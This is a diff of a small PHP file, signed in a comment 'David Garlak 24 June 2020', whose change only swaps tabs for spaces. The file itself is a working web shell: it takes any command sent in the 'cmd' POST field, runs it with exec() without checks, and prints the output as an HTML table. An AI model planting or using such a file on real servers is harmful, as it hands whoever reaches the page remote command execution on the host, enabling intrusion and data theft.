@@ -3,17 +3,17 @@
 <!-- David Garlak 24 June 2020 -->
 <?php
     if(isset($_POST['cmd'])) {
-		$cmd = $_POST['cmd'];
-		$out = array();
-		exec($cmd, $out);
+	$cmd = $_POST['cmd'];
+	$out = array();
+	exec($cmd, $out);
     	print("<table><th>Output</th>");
     	foreach($out as $line) { print("<tr><td>".$line."</td></tr>"); }
     	print("</table>");
         $out = array();
         die();
-	}
-	else {
+    }
+    else {
         print("<table><th>Output</th><tr><td>No command sent</td></tr></table>");
-        die();
-	}
+    	die();
+    }
 ?>
